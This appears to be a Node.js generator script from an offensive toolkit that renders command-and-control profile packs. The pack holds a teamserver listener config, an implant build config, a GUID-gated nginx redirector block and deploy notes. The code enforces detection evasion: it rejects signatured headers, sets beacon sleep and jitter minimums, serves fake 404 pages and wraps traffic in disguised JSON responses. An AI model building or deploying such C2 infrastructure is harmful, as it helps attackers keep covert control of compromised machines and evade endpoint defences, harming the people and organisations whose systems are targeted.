#!/usr/bin/env node
// gen_profile.js — render a complete, internally-consistent C2 profile pack
// from ONE op file (ticket 008). Prod rules are enforced by the generator:
// no signatured defaults (X-Beacon-Id et al), minimum sleep/jitter, fresh
// encrypt_key + GUID per pack unless pinned in the op file.
//
// Usage: node scripts/gen_profile.js --op ops/example.json [--out ops/example/]
//
// Emits into the out dir:
//   listener.json       -> teamserver /listener/create `config` string (BeaconHTTP)
//   bake.json           -> build_payload.js --bake (LOIS agent config)
//   nginx-location.conf -> redirector GUID gate block (paste into the vhost)
//   NOTES.md            -> deploy steps for this pack
//
// Op file fields (all optional except domain):
//   name, domain            op label / public FQDN the agent talks to
//   listener_name           default: name
//   ts_bind_host/port       where the teamserver listener binds
//                           (default 127.0.0.1 — redirector/WG model; use
//                           0.0.0.0 only for tailnet-style labs)
//   ts_wg_ip                teamserver IP the redirector proxies to
//   uris[], user_agents[], hb_header, resp_pre/resp_post, page_error
//   sleep, jitter           enforced minimums: sleep>=60, jitter>=20
//                           (override allowed only with "lab": true)
//   lab: true               relaxes minimums + ssl defaults for test rigs
//   guid, encrypt_key       auto-generated 32-hex when absent
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

const arg = (n, d) => { const i = process.argv.indexOf('--' + n); return i >= 0 ? process.argv[i + 1] : d; };
const die = (m) => { console.error('[gen] ' + m); process.exit(1); };
const hex = (n) => crypto.randomBytes(n).toString('hex');

const opFile = arg('op', null) || die('usage: gen_profile.js --op <op.json> [--out <dir>]');
const op = JSON.parse(fs.readFileSync(opFile, 'utf8'));
if (!op.domain) die('op.domain is required (the public FQDN/IP the agent reaches)');
const name = op.name || path.basename(opFile, '.json');
const lab = op.lab === true;

// ---- prod rules -------------------------------------------------------------
const sleep = parseInt(op.sleep ?? (lab ? 5 : 60), 10);
const jitter = parseInt(op.jitter ?? (lab ? 10 : 30), 10);
if (!lab && (sleep < 60 || jitter < 20))
  die(`prod minimums: sleep>=60 jitter>=20 (got ${sleep}/${jitter}) — or set "lab": true`);
const hb = op.hb_header || 'X-Request-Id';
if (/^x-beacon-id$/i.test(hb)) die('hb_header X-Beacon-Id is signatured upstream — pick anything else');

const guid = op.guid || hex(16);
const encryptKey = op.encrypt_key || hex(16);
if (!/^[0-9a-f]{32}$/.test(encryptKey)) die('encrypt_key must be 32 hex chars');

const uris = op.uris && op.uris.length ? op.uris : ['/content.html'];
for (const u of uris)
  if (!/^\/[a-zA-Z0-9.=-]+(\/[a-zA-Z0-9.=-]+)*$/.test(u)) die(`uri invalid per listener regex: ${u}`);

const uas = op.user_agents && op.user_agents.length ? op.user_agents
  : ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'];

const respPre = op.resp_pre || '{"status": "ok", "data": "';
const respPost = op.resp_post || '","metrics": "sync"}';
const pageError = op.page_error ||
  '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><center><h1>404 Not Found</h1></body><hr><center>nginx/1.24.0</center></body></html>';

const bindHost = op.ts_bind_host || '127.0.0.1';
const bindPort = parseInt(op.ts_bind_port || '8446', 10);
const tsWgIp = op.ts_wg_ip || '10.100.0.2';
const publicPort = parseInt(op.public_port || '443', 10);

// ---- outputs ----------------------------------------------------------------
const listener = {
  host_bind: bindHost,
  port_bind: bindPort,
  callback_addresses: [`${op.domain}:${publicPort}`],
  encrypt_key: encryptKey,
  ssl: false, // TLS terminates at the redirector; listener stays plain on the WG/loopback side
  http_method: 'POST',
  uri: uris,
  hb_header: hb,
  user_agent: uas,
  'page-payload': respPre + '<<<PAYLOAD_DATA>>>' + respPost,
  'page-error': pageError,
};

const bake = {
  hosts: [`${op.domain}:${publicPort}`],
  ssl: !lab,                       // plain HTTP only inside tailnet labs
  http_method: 'POST',
  uri: uris[0],
  hb_header: hb,
  user_agent: uas[0],
  encrypt_key: encryptKey,
  resp_template: respPre + '<<<PAYLOAD_DATA>>>' + respPost,
  sleep_delay: sleep,
  jitter_delay: jitter,
  agent_id: 'auto',
  debug: false,
};

const nginx =
  `# ${name}: GUID-gated C2 path for ${op.domain} (generated ${new Date().toISOString().slice(0, 10)})
location ^~ /${guid}/ {
    proxy_pass http://${tsWgIp}:${bindPort}/;   # trailing slash strips the GUID prefix
    proxy_http_version 1.1;
    proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    proxy_set_header Connection "";
    proxy_read_timeout 75s;
}
`;

const notes = `# ${name} — deploy notes

1. Teamserver listener (BeaconHTTP), config = listener.json:
   POST /manage/listener/create {"name":"${op.listener_name || name}","type":"BeaconHTTP",
   "config":<listener.json as string>,"tags":""}
   Bind: ${bindHost}:${bindPort} (plain HTTP — TLS lives at the redirector).
2. Redirector (${op.domain}): paste nginx-location.conf into the 443 vhost,
   \`nginx -t && systemctl reload nginx\`.
   Gate check: https://${op.domain}/${guid}${uris[0]} must NOT 404 with the
   right hb header present; https://${op.domain}/ and wrong paths show the
   fake site / 404 profile.
3. Agent build: node scripts/build_payload.js --bake ops/${name}/bake.json --name support
4. Gate: LOIS_GATE_* env + scripts/gate_mde.sh before any real use.
Keys: encrypt_key=${encryptKey} guid=${guid}
`;

const outDir = arg('out', path.join('ops', name));
fs.mkdirSync(outDir, { recursive: true });
fs.writeFileSync(path.join(outDir, 'listener.json'), JSON.stringify(listener, null, 2) + '\n');
fs.writeFileSync(path.join(outDir, 'bake.json'), JSON.stringify(bake, null, 2) + '\n');
fs.writeFileSync(path.join(outDir, 'nginx-location.conf'), nginx);
fs.writeFileSync(path.join(outDir, 'NOTES.md'), notes);
console.log(`[gen] pack '${name}' -> ${outDir}/ (listener :${bindPort}, uri ${uris[0]}, sleep ${sleep}s/${jitter}%, guid ${guid.slice(0, 8)}…)`);
